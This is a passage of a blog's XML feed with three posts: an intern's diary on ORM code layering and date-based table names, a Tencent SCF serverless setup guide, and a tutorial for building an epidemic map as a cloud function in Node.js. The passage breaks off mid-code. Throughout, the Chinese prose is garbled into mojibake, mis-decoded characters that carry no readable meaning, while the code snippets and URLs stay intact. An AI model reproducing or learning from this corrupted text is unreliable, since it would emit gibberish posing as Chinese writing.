è§£è€¦</p><blockquote><p>ä½¿ç”¨default.yamlä½œä¸ºé…ç½®æ–‡ä»¶</p><p>ä»£ç åˆ†å±‚ï¼š</p><p>â€‹DOå±‚ ï¼š å­˜æ”¾ORMå¯¹è±¡</p><p>â€‹DAOå±‚ï¼š ç”¨äºå¯¹æ•°æ®åº“ä»¥åŠé…ç½®æ–‡ä»¶å¤„ç†</p><p>â€‹Serviceå±‚ï¼šå®ç°ä¸šåŠ¡é€»è¾‘</p></blockquote></li><li><p>æ ¹æ®éœ€æ±‚é‡å†™é€»è¾‘</p><blockquote><p>ç”±äºä»£ç ç»“æ„çš„åˆç†æ€§ï¼Œä¿®æ”¹å˜å¾—ç®€å•ã€‚</p></blockquote></li><li><p>é˜…è¯»æ–°æ•°æ®åº“ï¼Œåˆ†ææŠ½å–æœ‰ç”¨çš„éƒ¨åˆ†ï¼Œå¹¶ä¸”åˆ›å»ºå¯¹åº”çš„ORM DO</p><blockquote><p>å¦‚ä½•é’ˆå¯¹æ¯å¤©æ¥æ’å…¥æ•°æ®ï¼Ÿæ—¥æœŸçš„å¯¹æ¯”ï¼Ÿ</p><p>ç ”ç©¶pythonä¸­çš„æ—¥æœŸ</p><p>è¡¨åæ ¹æ®æ—¥æœŸå˜æ¢å¸¦æ¥çš„æ•°æ®åº“è¡¨è®¿é—®é—®é¢˜ï¼Ÿ</p></blockquote></li><li><p>å»ºç«‹ORMå¯¹è±¡å°æŠ€å·§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">` [a-zA-Z]*.*</span><br></pre></td></tr></table></figure></li></ul><h2><span id="2020x2f6x2f11">2020&#x2F;6&#x2F;11</span></h2><ul><li><p>åŠ¨æ€æ”¹å˜è¡¨å</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">OptServerInfoGetter</span>(<span class="params">suffix, Base_class=Base</span>):</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">OptServerRelationInfo</span>(<span class="title class_ inherited__">Base_class</span>):</span><br><span class="line">     __tablename__ = <span class="string">&#x27;opt_info_&#x27;</span> + suffix</span><br><span class="line">     manageip = Column(String(<span class="number">16</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">     interface = Column(String(<span class="number">64</span>))</span><br><span class="line">     description = Column(String(<span class="number">128</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">     status = Column(String)</span><br><span class="line">     bandwidth = Column()</span><br><span class="line">     unitType = Column()</span><br><span class="line">     rateCount = Column()</span><br><span class="line">     ratePkgCount = Column()</span><br><span class="line">     outputunitType = Column()</span><br><span class="line">     outputrateCount = Column()</span><br><span class="line">     outputratePkgCount = Column()</span><br><span class="line">     orderlist = Column()</span><br><span class="line"> <span class="keyword">return</span> OptServerRelationInfo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OptServerRelationInfo = OptServerInfoGetter(<span class="string">&#x27;20200609&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>ç»§ç»­ä¼˜åŒ–ä»£ç </p><blockquote><p>â€‹DOï¼š å­˜æ”¾ORMå¯¹è±¡</p><p>â€‹DAOï¼š ç”¨äºå¯¹æ•°æ®åº“ä»¥åŠé…ç½®æ–‡ä»¶å¤„ç†</p><p>â€‹Serviceï¼šå®ç°ä¸šåŠ¡é€»è¾‘</p><p>â€‹Utilsï¼šå®ç°å…¶ä½™å·¥å…·åŠŸèƒ½</p></blockquote></li><li><p>éœ€è¦è®²ä¸€ä¸‹å«æ˜Ÿçš„é¡¹ç›®ï¼š</p></li><li><p>è®¨è®ºäº†ä¸€ä¸‹æ•°æ®çš„æ¥æºé—®é¢˜</p><blockquote><p>è¿›åˆ¶æ¢ç®—1k ç„¶åå³°å€¼è®¡ç®—éœ€è¦sumæ¥åš</p></blockquote></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç¬”è€…ä¹‹å‰ä½¿ç”¨çš„Javaå±…å¤šï¼Œè¿›å…¥è…¾è®¯å®ä¹ å¾—è½¬C++ï¼Œå› æ­¤ç›¸å¯¹C++å·¥ç¨‹å¸ˆæ¥è¯´åŸºç¡€ä¸º0ã€‚æƒ³é€šè¿‡æ—¥è®°çš„æ–¹å¼è®°å½•è‡ªå·±çš„æˆé•¿å’Œç”Ÿæ´»çš„ä¸€äº›çäº‹ï¼Œäº‰å–è½¬æ­£ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="log" scheme="https://disda-coding.github.io/categories/log/"/>
    
    
    <category term="å®ä¹ æ—¥è®°" scheme="https://disda-coding.github.io/tags/%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Tencent-SCF</title>
    <link href="https://disda-coding.github.io/2020/05/07/SCF/"/>
    <id>https://disda-coding.github.io/2020/05/07/SCF/</id>
    <published>2020-05-07T04:50:50.000Z</published>
    <updated>2023-03-31T02:21:27.199Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>è®°å½•ä¸€ä¸‹ä½¿ç”¨serverless SCFä¸­å®è·µçš„è¿‡ç¨‹é‡åˆ°çš„ä¸€äº›å‘ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83">é…ç½®ç¯å¢ƒ</a><ul><li><a href="#%E8%AE%BE%E7%BD%AEapi%E5%AF%86%E9%92%A5">è®¾ç½®APIå¯†é’¥</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E8%A7%92%E8%89%B2">è®¾ç½®è§’è‰²</a></li></ul></li><li><a href="#%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83">ç”Ÿäº§ç¯å¢ƒ</a><ul><li><a href="#%E6%8E%A7%E5%88%B6%E5%8F%B0">æ§åˆ¶å°</a></li><li><a href="#cli">CLI</a></li><li><a href="#vscode%E6%8E%A8%E8%8D%90">VSCodeï¼ˆæ¨èï¼‰</a></li></ul></li><li><a href="#scf%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8">SCFè¿›é˜¶ä½¿ç”¨</a><ul><li><a href="#%E6%B5%8B%E8%AF%95">æµ‹è¯•</a></li><li><a href="#%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2">æ—¥å¿—æŸ¥è¯¢</a></li><li><a href="#scf%E7%9B%91%E6%8E%A7%E4%B8%8E%E5%91%8A%E8%AD%A6">SCFç›‘æ§ä¸å‘Šè­¦</a></li></ul></li><li><a href="#scf%E8%A7%A6%E5%8F%91%E5%99%A8%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE">SCFè§¦å‘å™¨ç±»å‹ä»¥åŠå¦‚ä½•é…ç½®</a><ul><li><a href="#%E8%A7%A6%E5%8F%91%E5%99%A8%E7%B1%BB%E5%9E%8B">è§¦å‘å™¨ç±»å‹</a></li><li><a href="#scf%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%85%8D%E7%BD%AE">SCFç½‘ç»œä¸é…ç½®</a><ul><li><a href="#%E9%85%8D%E7%BD%AEvpc">é…ç½®VPC</a></li></ul></li><li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">é…ç½®ç¯å¢ƒå˜é‡</a></li><li><a href="#api-explorer">API Explorer</a></li></ul></li></ul><!-- tocstop --><h1><span id="é…ç½®ç¯å¢ƒ">é…ç½®ç¯å¢ƒ</span></h1><h2><span id="è®¾ç½®apiå¯†é’¥">è®¾ç½®APIå¯†é’¥</span></h2><p><img src="/2020/05/07/SCF/image-20200507125902880.png" alt="è®¾ç½®APIå¯†é’¥"></p><p>ç™»å½•è…¾è®¯äº‘ï¼Œåœ¨äº‘äº§å“ä¸­å»è®¾ç½®ä¸€ä¸ªæ–°çš„ç§˜é’¥ã€‚</p><h2><span id="è®¾ç½®è§’è‰²">è®¾ç½®è§’è‰²</span></h2><p><img src="/2020/05/07/SCF/image-20200507130010962.png" alt="è®¾ç½®è§’è‰²"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬éœ€è¦ä¸ºscfå»è®¾ç½®è§’è‰²ï¼Œé˜²æ­¢ä¸Šä¼ çš„æ—¶å€™å‡ºç°é—®é¢˜ã€‚</p><p><img src="/2020/05/07/SCF/image-20200507130137864.png"></p><p>é€‰æ‹©ä¸€ä¸ªç­–ç•¥åï¼Œç„¶åé‡å‘½åä¸ºSCF_QcsRoleï¼Œè¿™ä¸ªæ˜¯ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·çš„æ—¶å€™è¿è¡Œscf deployçš„æ—¶å€™é»˜è®¤ä¸Šä¼ ä½¿ç”¨çš„åå­—ã€‚</p><h1><span id="ç”Ÿäº§ç¯å¢ƒ">ç”Ÿäº§ç¯å¢ƒ</span></h1><h2><span id="æ§åˆ¶å°">æ§åˆ¶å°</span></h2><p>ç›´æ¥æ‰“å¼€æˆ‘ä»¬webç«¯çš„æ§åˆ¶å°å»coding</p><h2><span id="cli">CLI</span></h2><ul><li>é…ç½®pythonç¯å¢ƒå’Œpipã€‚</li></ul><p><a href="https://cloud.tencent.com/document/product/583/33449">https://cloud.tencent.com/document/product/583/33449</a> æ ¹æ®é“¾æ¥é…ç½®</p><ul><li>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¹¶æŒ‰ç…§æç¤ºè¾“å…¥å¯¹åº”ä¿¡æ¯ï¼š</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ scf configure <span class="built_in">set</span></span><br><span class="line">[-] appid = <span class="number">1255721742</span></span><br><span class="line">[-] region = ap-guangzhou</span><br><span class="line">[-] secret-id = ********************************cEr7</span><br><span class="line">[-] secret-key = ****************************mkYA</span><br><span class="line">[-] using-cos = True (By default, it is deployed by COS.)</span><br><span class="line">Allow report information to <span class="built_in">help</span> us optimize scfcli(Y/n):</span><br></pre></td></tr></table></figure><h2><span id="vscodeæ¨è">VSCodeï¼ˆæ¨èï¼‰</span></h2><p>ä¸‹è½½tencent scfæ’ä»¶å³å¯ã€‚</p><h1><span id="scfè¿›é˜¶ä½¿ç”¨">SCFè¿›é˜¶ä½¿ç”¨</span></h1><h2><span id="æµ‹è¯•">æµ‹è¯•</span></h2><ul><li>VSCode</li></ul><blockquote><p>ä½¿ç”¨æœ¬åœ°è°ƒè¯•ï¼Œç„¶åé€‰æ‹©æ–¹æ³•å³å¯</p></blockquote><p><img src="/2020/05/07/SCF/image-20200507132307806.png"></p><ul><li>æ§åˆ¶å°</li></ul><blockquote><p>é€šè¿‡ å‡½æ•°æœåŠ¡-&gt; å‡½æ•°ä»£ç é‡Œé¢é€‰æ‹©æµ‹è¯•æ–¹æ³•å³å¯</p></blockquote><p><img src="/2020/05/07/SCF/image-20200507132358519.png"></p><p><img src="/2020/05/07/SCF/image-20200507132425062.png"></p><h2><span id="æ—¥å¿—æŸ¥è¯¢">æ—¥å¿—æŸ¥è¯¢</span></h2><ul><li><p>æ–¹æ³•ä¸€</p><blockquote><p>åœ¨æ§åˆ¶å°ç‚¹å‡» æ—¥å¿—æŸ¥è¯¢</p></blockquote></li><li><p>æ–¹æ³•äºŒ</p><blockquote><p>é…ç½®æ—¥å¿—æµæ°´</p></blockquote></li></ul><p><img src="/2020/05/07/SCF/image-20200507132646019.png" alt="æ—¥å¿—æµæ°´"></p><ol><li><p>åˆ›å»ºæ—¥å¿—é›†ï¼ˆåœ°ç‚¹ä¸€å®šè¦ä¿æŒä¸€è‡´ï¼‰</p><p><img src="/2020/05/07/SCF/image-20200507133349054.png"></p></li><li><p>åˆ›å»ºæ—¥å¿—ä¸»é¢˜</p><p><img src="/2020/05/07/SCF/image-20200507133421836.png"></p></li><li><p>åˆ›å»ºæ—¥å¿—ç´¢å¼•</p><p><img src="/2020/05/07/SCF/image-20200507133451675.png"></p></li><li><p>äº‘å‡½æ•°é…ç½®æ—¥å¿—æŠ•é€’</p><p><img src="/2020/05/07/SCF/image-20200507133545799.png"></p></li><li><p>æŸ¥è¯¢æ—¥å¿—</p><p><img src="/2020/05/07/SCF/image-20200507133738427.png"></p></li></ol><p>åœ¨å‡½æ•°é…ç½®ä¸­å¯ä»¥é…ç½®æ—¥å¿—æŠ•é€’ä¿¡æ¯ï¼Œé€‰æ‹©æ—¥å¿—é›†å°±å¯ä»¥äº†ã€‚</p><h2><span id="scfç›‘æ§ä¸å‘Šè­¦">SCFç›‘æ§ä¸å‘Šè­¦</span></h2><ol><li><p>å„é¡¹ç›‘æ§ä¿¡æ¯</p><blockquote><p>å¯ä»¥åœ¨ ç›‘æ§ä¿¡æ¯ é‡Œé¢çœ‹åˆ°</p></blockquote></li><li><p>é…ç½®å‘Šè­¦</p><p><img src="/2020/05/07/SCF/image-20200507134302273.png"></p><p><img src="/2020/05/07/SCF/image-20200507134340161.png"></p><p><img src="/2020/05/07/SCF/image-20200507134616754.png"></p><p><img src="/2020/05/07/SCF/image-20200507134558753.png"></p><p><img src="/2020/05/07/SCF/image-20200507143042137.png"></p></li></ol><h1><span id="scfè§¦å‘å™¨ç±»å‹ä»¥åŠå¦‚ä½•é…ç½®">SCFè§¦å‘å™¨ç±»å‹ä»¥åŠå¦‚ä½•é…ç½®</span></h1><h2><span id="è§¦å‘å™¨ç±»å‹">è§¦å‘å™¨ç±»å‹</span></h2><ul><li>å®šæ—¶è§¦å‘</li><li>COSè§¦å‘</li><li>CMQä¸»é¢˜è®¢é˜…è§¦å‘</li><li>Ckafkaè§¦å‘</li><li>APIç½‘å…³è§¦å‘</li></ul><h2><span id="scfç½‘ç»œä¸é…ç½®">SCFç½‘ç»œä¸é…ç½®</span></h2><p><img src="/2020/05/07/SCF/image-20200507143736842.png"></p><h3><span id="é…ç½®vpc">é…ç½®VPC</span></h3><p><img src="/2020/05/07/SCF/image-20200507155739972.png"></p><p><img src="/2020/05/07/SCF/image-20200507155713492.png"></p><h2><span id="é…ç½®ç¯å¢ƒå˜é‡">é…ç½®ç¯å¢ƒå˜é‡</span></h2><p><img src="/2020/05/07/SCF/image-20200507155926430.png"></p><h2><span id="api-explorer">API Explorer</span></h2><blockquote><p>æ–‡æ¡£-&gt;APIä¸­å¿ƒ-&gt;äº‘å‡½æ•°-&gt;å‡½æ•°ç›¸å…³æ¥å£-&gt;è¿è¡Œå‡½æ•°-&gt;API Explorer</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•ä¸€ä¸‹ä½¿ç”¨serverless SCFä¸­å®è·µçš„è¿‡ç¨‹é‡åˆ°çš„ä¸€äº›å‘ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="log" scheme="https://disda-coding.github.io/categories/log/"/>
    
    
    <category term="å®ä¹ " scheme="https://disda-coding.github.io/tags/%E5%AE%9E%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>SCFä¹‹ç–«æƒ…åœ°å›¾</title>
    <link href="https://disda-coding.github.io/2020/05/07/yiqing/"/>
    <id>https://disda-coding.github.io/2020/05/07/yiqing/</id>
    <published>2020-05-07T04:50:50.000Z</published>
    <updated>2023-03-31T08:13:24.425Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%88%B6%E4%BD%9C%E7%96%AB%E6%83%85%E5%9C%B0%E5%9B%BE">åˆ¶ä½œç–«æƒ…åœ°å›¾</a><ul><li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">å‡†å¤‡å·¥ä½œ</a></li><li><a href="#%E6%95%88%E6%9E%9C%E9%A2%84%E8%A7%88">æ•ˆæœé¢„è§ˆ</a></li><li><a href="#%E7%9F%A5%E8%AF%86%E7%82%B9">çŸ¥è¯†ç‚¹</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E4%B8%80-%E8%A1%A5%E5%85%85%E4%BA%91%E5%87%BD%E6%95%B0%E9%80%BB%E8%BE%91">ä»»åŠ¡ä¸€ è¡¥å……äº‘å‡½æ•°é€»è¾‘</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E4%BA%8C-%E7%BB%99%E6%A8%A1%E6%9D%BF%E8%A1%A5%E5%85%85%E9%80%BB%E8%BE%91">ä»»åŠ¡äºŒ ç»™æ¨¡æ¿è¡¥å……é€»è¾‘</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E4%B8%89-%E5%88%9B%E5%BB%BA-api-%E7%BD%91%E5%85%B3%E8%A7%A6%E5%8F%91%E5%99%A8">ä»»åŠ¡ä¸‰ åˆ›å»º API ç½‘å…³è§¦å‘å™¨</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E5%9B%9B-%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D">ä»»åŠ¡å›› æ·»åŠ è‡ªå®šä¹‰åŸŸå</a></li></ul></li></ul><!-- tocstop --><h1><span id="åˆ¶ä½œç–«æƒ…åœ°å›¾">åˆ¶ä½œç–«æƒ…åœ°å›¾</span></h1><h2><span id="å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</span></h2><ol><li>è¿›å…¥è…¾è®¯äº‘æ§åˆ¶å°ï¼Œåœ¨å·¦ä¸Šè§’äº‘äº§å“èœå•é‡Œï¼Œé€‰æ‹©ã€ç®¡ç†ä¸å®¡è®¡ã€‘-&gt; ã€è®¿é—®ç®¡ç†ã€‘ï¼Œè¿›å…¥ååœ¨å·¦è¾¹èœå•æ ä¸­é€‰æ‹©ã€è®¿é—®å¯†é’¥ã€‘-&gt;ã€API å¯†é’¥ç®¡ç†ã€‘ï¼Œç”Ÿæˆå¹¶è·å–ä¸€å¯¹ API å¯†é’¥ã€‚</li></ol><p><img src="https://camo.githubusercontent.com/89a1dd621bc76992d556458a4556ae5ad2fdd5f2/68747470733a2f2f61736b2e71636c6f7564696d672e636f6d2f64726166742f313031313631382f676570653077626163332e706e67" alt="è·å–è…¾è®¯äº‘APIå¯†é’¥"></p><ol start="2"><li><p>åœ¨ç”µè„‘å®‰è£… <code>Node.js</code> è¯­è¨€è¿è¡Œç¯å¢ƒï¼Œå»ºè®®å¤§äº 8.0 ç‰ˆæœ¬ã€‚</p></li><li><p>å®‰è£… <code>VS Code</code> + <code>Tencent Serverless Toolkit</code> æ’ä»¶ï¼Œæˆ–è€…å®‰è£…å‘½ä»¤è¡Œå·¥å…·ã€‚</p></li></ol><p>å‰è€…å¯å‚è€ƒæ–‡æ¡£ï¼š<a href="https://cloud.tencent.com/document/product/583/38106">https://cloud.tencent.com/document/product/583/38106</a><br>åå°å¯å‚è€ƒæ–‡æ¡£ï¼š<a href="https://cloud.tencent.com/document/product/583/33445">https://cloud.tencent.com/document/product/583/33445</a></p><p>é€šè¿‡äº†è§£æ–‡æ¡£ï¼Œæˆ–è€…æœ¬è¯¾ç¨‹ä¹‹å‰çš„ç« èŠ‚ï¼Œå­¦ä¹ å¦‚ä½•ç”¨<code>VS Code</code>æ’ä»¶æˆ–å‘½ä»¤è¡Œå·¥å…·åˆ›å»ºå’Œä¸Šä¼ äº‘å‡½æ•°ã€‚</p><p>å­¦ä¹ å®Œåï¼Œè¯·åˆ›å»ºä¸€ä¸ªåä¸º <code>yiqing</code> çš„äº‘å‡½æ•°ã€‚</p><ol start="4"><li>åœ¨<a href="https://github.com/lcxfs1991/tencentcloudcourse">https://github.com/lcxfs1991/tencentcloudcourse</a>ä¸‹è½½æœ¬è¯¾ç¨‹çš„ä»£ç åŒ…ï¼Œç›®å½•æ˜¯ <code>scr/yiqing</code>ï¼Œå¹¶å°†é‡Œé¢çš„ä»£ç è¦†ç›–åˆšæ‰æ–°åˆ›å»ºçš„<code>yiqing</code>äº‘å‡½æ•°ä¸­çš„æ–‡ä»¶ã€‚ç„¶ååœ¨è¯¥ç›®å½•ä¸­å‘½ä»¤è¡Œè¿è¡Œ<code>npm i</code>ï¼Œå®‰è£…ä»£ç åŒ…çš„ä¾èµ–ã€‚</li></ol><h2><span id="æ•ˆæœé¢„è§ˆ">æ•ˆæœé¢„è§ˆ</span></h2><p><img src="https://user-images.githubusercontent.com/3348398/73936655-44c79b00-491e-11ea-8bb1-aada7aa08cfa.png" alt="ç–«æƒ…åœ°å›¾"></p><h2><span id="çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</span></h2><ol><li>çŸ¥é“å¦‚ä½•åˆ©ç”¨å·¥å…·åˆ›å»ºå’Œä¸Šä¼ äº‘å‡½æ•°</li><li>çŸ¥é“å¦‚ä½•åˆ›å»º<code>API</code>ç½‘å…³è§¦å‘å™¨</li><li>çŸ¥é“å¦‚ä½•åœ¨äº‘å‡½æ•°ä¸­éƒ¨ç½²èƒ½æ¸²æŸ“<code>HTML</code>çš„æœåŠ¡</li><li>EChart.js çš„ä½¿ç”¨</li></ol><h2><span id="ä»»åŠ¡ä¸€-è¡¥å……äº‘å‡½æ•°é€»è¾‘">ä»»åŠ¡ä¸€ è¡¥å……äº‘å‡½æ•°é€»è¾‘</span></h2><p>åœ¨äº‘å‡½æ•°<code>yiqing</code>çš„<code>index.js</code>æ–‡ä»¶ä¸­ï¼Œæ ¹æ®æ­¥éª¤æç¤ºï¼Œè¡¥å……ä»¥ä¸‹çš„é€»è¾‘ã€‚å…¶ä¸­å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¯¥äº‘å‡½æ•°é™¤äº†æ‰¿æ‹…æ¸²æŸ“ html çš„èƒ½åŠ›ï¼Œè¿˜æ‰¿æ‹…äº†è¾“å‡ºæ•°æ®çš„èƒ½åŠ›ï¼Œè¿™å®Œå…¨æ˜¯é€šè¿‡é“¾æ¥ä¸­çš„<code>api</code>å‚æ•°å†³å®šã€‚é€šè¿‡è¿™æ ·çš„åŒºåˆ«è¾“å‡ºï¼Œå°±çœäº†å¤šåˆ¶ä½œä¸€ä¸ªäº‘å‡½æ•°çš„éº»çƒ¦ï¼Œå¯è°“æ˜¯ä¸€ä¸¾ä¸¤å¾—ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. æ¥å—é“¾æ¥ä¸Šçš„queryå‚æ•°apiï¼Œç”¨äºåˆ¤æ–­æ˜¯è¾“å‡ºhtmlï¼Œè¿˜æ˜¯è¾“å‡ºæ•°æ•°</span></span><br><span class="line"><span class="keyword">let</span> api = event.<span class="property">queryString</span>.<span class="property">api</span> || <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. è¯·æ±‚ç–«æƒ…æ•°æ®</span></span><br><span class="line"><span class="keyword">let</span> result = <span class="keyword">await</span> axios.<span class="title function_">get</span>(</span><br><span class="line">  <span class="string">`https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5`</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. ä¸­å›½åœ°å›¾æ•°æ®</span></span><br><span class="line"><span class="keyword">let</span> china_map = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">require</span>(<span class="string">&#x27;./china.json&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. è§£æå¹¶æ¸²æŸ“ html é¡µé¢</span></span><br><span class="line"><span class="keyword">let</span> html = fs.<span class="title function_">readFileSync</span>(path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./index.html&#x27;</span>), &#123;</span><br><span class="line">  <span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">html = <span class="title function_">render</span>(html, &#123; <span class="attr">disease_data</span>: result.<span class="property">data</span>.<span class="property">data</span>, china_map &#125;);</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä»¥å¤–ï¼Œç”±äºåé¢åˆ›å»ºç½‘å…³çš„æ—¶å€™ï¼Œè¦ä½¿ç”¨ç½‘å…³çš„é›†æˆå“åº”ï¼Œå› æ­¤å¿…é¡»æŒ‰ç…§ä»¥ä¸‹çš„æ ¼å¼å¯¹äº‘å‡½æ•°è¿›è¡Œè¾“å‡ºï¼Œè€Œä¸èƒ½ç›´æ¥è¿”å›ä¸€æ®µæ•°æ®ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!api) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">isBase64Encoded</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">statusCode</span>: <span class="number">200</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span> &#125;,</span><br><span class="line">    <span class="attr">body</span>: html</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. è¾“å‡ºç–«æƒ…æ•°æ®</span></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  <span class="attr">isBase64Encoded</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">statusCode</span>: <span class="number">200</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;,</span><br><span class="line">  <span class="attr">body</span>: result.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2><span id="ä»»åŠ¡äºŒ-ç»™æ¨¡æ¿è¡¥å……é€»è¾‘">ä»»åŠ¡äºŒ ç»™æ¨¡æ¿è¡¥å……é€»è¾‘</span></h2><p>åœ¨äº‘å‡½æ•°<code>yiqing</code>çš„<code>index.html</code>æ–‡ä»¶ä¸­ï¼Œæ ¹æ®æ­¥éª¤æç¤ºï¼Œè¡¥å……ä»¥ä¸‹çš„é€»è¾‘ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. å¡«å……åœ°å›¾æ¨¡æ¿å˜é‡</span></span><br><span class="line"><span class="keyword">let</span> china_map = $&#123;china_map&#125; || <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. å¡«å……ç¡®è¯Šã€ç–‘ä¼¼ã€æ²»æ„ˆã€æ­»äº¡æ•°æ®</span></span><br><span class="line"><span class="keyword">let</span> chinaTotal = disease_data.<span class="property">chinaTotal</span>;</span><br><span class="line"><span class="keyword">let</span> chinaAdd = disease_data.<span class="property">chinaAdd</span>;</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;.confirm .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.confirm&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.suspect .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.suspect&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.cure .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.heal&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.dead .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.dead&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;.confirm .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.confirm&#125;</span>`</span>);</span><br><span class="line">$(<span 